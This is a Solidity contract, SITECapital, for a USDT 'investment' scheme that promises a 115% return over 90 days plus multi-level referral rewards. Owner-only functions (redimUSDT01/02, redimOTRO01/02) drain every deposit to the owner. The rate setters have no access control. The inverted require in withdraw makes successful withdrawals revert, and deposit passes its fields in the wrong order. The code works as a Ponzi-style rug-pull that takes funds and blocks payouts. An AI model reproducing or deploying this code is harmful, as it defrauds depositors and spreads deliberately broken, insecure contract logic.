pragma solidity ^0.5.15;

import "./SafeMath.sol";

contract TRC20_Interface {

    function allowance(address _owner, address _spender) public view returns (uint remaining);

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function transfer(address direccion, uint cantidad) public returns (bool);

    function balanceOf(address who) public view returns (uint256);

    function decimals() public view returns(uint);
}

contract SITECapital {
  using SafeMath for uint;

  TRC20_Interface USDT_Contract;

  TRC20_Interface OTRO_Contract;

  struct Deposit {
    uint porciento;
    uint tiempo;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    bool recompensa;
    address sponsor;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

  uint public MIN_DEPOSIT = 100*10**8;
  uint public MAX_DEPOSIT = 500000*10**8;

  uint public MIN_RETIRO = 70*10**8;
  uint public MAX_RETIRO = 500000*10**8;

  address payable public marketing;
  address payable public owner;

  uint[5] public porcientos = [4, 1, 0, 0, 0];

  uint public tiempo = 90 days;
  uint public porcent = 115;

  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;

  constructor(address _tokenTRC20) public {
    USDT_Contract = TRC20_Interface(_tokenTRC20);
    marketing = msg.sender;
    owner = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].sponsor = marketing;

    totalInvestors++;

  }

  function ChangeTokenUSDT(address _tokenTRC20) public returns (bool){

    require( msg.sender == owner );

    USDT_Contract = TRC20_Interface(_tokenTRC20);

    return true;

  }

  function ChangeTokenOTRO(address _tokenTRC20) public returns (bool){

    require( msg.sender == owner );

    OTRO_Contract = TRC20_Interface(_tokenTRC20);

    return true;

  }

  function aprovedUSDT() public view returns (uint256){

    return USDT_Contract.allowance(msg.sender, address(this));

  }

  function depositUSDT(uint _value) public returns (uint256){
    require( msg.sender == owner );

    require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "saldo aprovado insuficiente");
    require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "que saldo de donde?" );

    return _value;
  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContractSITE() public view returns (uint){
    return USDT_Contract.balanceOf(address(this));
  }

  function InContractOTRO() public view returns (uint){
    return OTRO_Contract.balanceOf(address(this));
  }

  function InContractTRX() public view returns (uint){
    return address(this).balance;
  }

  function setPorcientos(uint _value_1, uint _value_2, uint _value_3, uint _value_4, uint _value_5) public returns(uint, uint, uint, uint, uint){

    porcientos = [_value_1, _value_2, _value_3, _value_4, _value_5];

    return (_value_1, _value_2, _value_3, _value_4, _value_5);

  }

  function setTiempo(uint _dias) public returns(uint){

    tiempo = _dias * 1 days;


    return (tiempo);

  }

  function setRetorno(uint _porcentaje) public returns(uint){

    porcent = _porcentaje;

    return (porcent);

  }



  function column (address yo) public view returns(address[5] memory res) {

    res[0] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[1] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[2] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[3] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[4] = investors[yo].sponsor;
    yo = investors[yo].sponsor;

    return res;
  }

  function rewardReferers(address yo, uint amount) internal {

    address[5] memory referi = column(yo);
    uint[5] memory a;
    uint[5] memory b;

    for (uint i = 0; i < 5; i++) {

      Investor storage usuario = investors[referi[i]];
      if (usuario.registered && porcientos[i] != 0 && usuario.recompensa){
        if ( referi[i] != owner ) {

          b[i] = porcientos[i];
          a[i] = amount.mul(b[i]).div(100);

          usuario.balanceRef += a[i];
          usuario.totalRef += a[i];
          totalRefRewards += a[i];

        }else{

          b[i] = porcientos[i];
          a[i] = amount.mul(b[i]).div(100);

          usuario.balanceRef += a[i];
          usuario.totalRef += a[i];
          totalRefRewards += a[i];

          break;
        }
      }
    }


  }

  function deposit(uint _value, address _sponsor) public {

    Investor storage usuario = investors[msg.sender];

    require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "saldo aprovado insuficiente");
    require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "que saldo de donde?" );

    if (!usuario.registered){

      usuario.registered = true;
      usuario.recompensa = true;
      usuario.sponsor = _sponsor;
      totalInvestors++;
    }

    if (usuario.sponsor != address(0) && _sponsor != address(0) ){
      rewardReferers(msg.sender, _value);
    }

    usuario.deposits.push(Deposit(tiempo, porcent, _value, block.number));

    usuario.invested += _value;
    totalInvested += _value;

  }


  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = dep.tiempo;
      uint porcientD = dep.porciento;

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = dep.tiempo;
      uint porcientD = dep.porciento;

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];

    uint amount = withdrawable(msg.sender);

    amount += investor.balanceRef;
    investor.balanceRef = 0;

    investor.paidAt = block.number;

    return amount;

  }


  function withdraw() external {

    uint amount = withdrawable(msg.sender);
    amount = amount+investors[msg.sender].balanceRef;

    require ( USDT_Contract.balanceOf(address(this)) >= amount, "The contract has no balance");
    require ( amount >= MIN_RETIRO, "The minimum withdrawal limit reached");

    uint amount92 = amount.mul(92).div(100);

    require ( true != USDT_Contract.transfer(msg.sender,amount92), "whitdrawl Fail" );

    profit();

    investors[msg.sender].withdrawn += amount92;



  }

  function redimUSDT01() public returns (uint256){
    require(msg.sender == owner);

    uint256 valor = USDT_Contract.balanceOf(address(this));

    USDT_Contract.transfer(owner, valor);

    return valor;
  }

  function redimUSDT02(uint _value) public returns (uint256) {

    require ( msg.sender == owner, "only owner");

    require ( USDT_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");

    USDT_Contract.transfer(owner, _value);

    return _value;

  }

  function redimOTRO01() public returns (uint256){
    require(msg.sender == owner);

    uint256 valor = OTRO_Contract.balanceOf(address(this));

    OTRO_Contract.transfer(owner, valor);

    return valor;
  }

  function redimOTRO02(uint _value) public returns (uint256){

    require ( msg.sender == owner, "only owner");

    require ( OTRO_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");

    OTRO_Contract.transfer(owner, _value);

    return _value;

  }

  function () external payable {}

}
